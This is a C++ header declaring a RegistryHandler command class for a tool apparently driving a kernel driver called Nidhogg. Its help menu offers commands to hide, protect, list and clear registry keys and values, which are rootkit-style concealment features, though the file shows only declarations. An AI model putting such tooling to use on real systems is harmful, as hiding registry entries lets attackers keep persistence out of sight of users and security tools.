#pragma once
#include "pch.h"
#include "CommandHandler.h"

constexpr wchar_t HKLM_HIVE[] = LR"(\Registry\Machine)";
constexpr wchar_t HKCR_HIVE[] = LR"(\Registry\Machine\SOFTWARE\Classes)";
constexpr wchar_t HKU_HIVE[] = LR"(\Registry\User)";
constexpr wchar_t HKLM[] = L"HKEY_LOCAL_MACHINE";
constexpr wchar_t HKLM_SHORT[] = L"HKLM";
constexpr wchar_t HKU[] = L"HKEY_USERS";
constexpr wchar_t HKU_SHORT[] = L"HKU";
constexpr wchar_t HKCU[] = L"HKEY_CURRENT_USER";
constexpr wchar_t HKCU_SHORT[] = L"HKCU";
constexpr wchar_t HKCR[] = L"HKEY_CLASSES_ROOT";
constexpr wchar_t HKCR_SHORT[] = L"HKCR";

typedef std::vector<std::tuple<std::wstring, std::wstring>> RegValueList;

class RegistryHandlerException : public std::runtime_error {
private:
	std::string msg;
public:
	RegistryHandlerException(_In_ const std::string& message)
		: std::runtime_error(message), msg(message) {}
	const char* what() const override {
		return msg.c_str();
	}
};

class RegistryHandler : public CommandHandler {
private:
	std::wstring ParseRegistryKey(_In_ const std::wstring& key);
	bool ProtectKey(_In_ const std::wstring& key, _In_ bool protect);
	bool HideKey(_In_ const std::wstring& key, _In_ bool hide);
	bool ProtectValue(_In_ const std::wstring& key, _In_ const std::wstring& valueName, _In_ bool protect);
	bool HideValue(_In_ const std::wstring& key, _In_ const std::wstring& valueName, _In_ bool hide);
	std::vector<std::wstring> ListKeys(_In_ RegItemType type);
	RegValueList ListValues(_In_ RegItemType type);
	bool ClearRegItem(_In_ RegItemType type);
	bool CheckInput(_In_ const std::vector<std::wstring>& params);

public:
	RegistryHandler(_In_ std::shared_ptr<HANDLE> hNidhogg) : CommandHandler("Registry", hNidhogg) {};

	void PrintHelp() override {
		std::cout << termcolor::bright_magenta << termcolor::underline << "Options:" << termcolor::reset << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "exit - Exit the program" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "back - Go back to the main menu" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[add | protect] [key] [value] - Protecting a registry key or value from being deleted" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[remove | unprotect] [key] [value] - Removing protection from a registry key or value" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "hide [key] [value] - Hide a a registry key or value" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[unhide | restore] [pid] - Revealing a registry key or value after hiding it" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "list [hidden | protected] [keys | values] - Listing the currently hidden or protected registry keys or values" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "clear [all | [hidden | protected] [keys | values]] - Clear all hidden or protected registry keys or values" << std::endl;
	}

	void HandleCommand(_In_ std::string command) override;
};

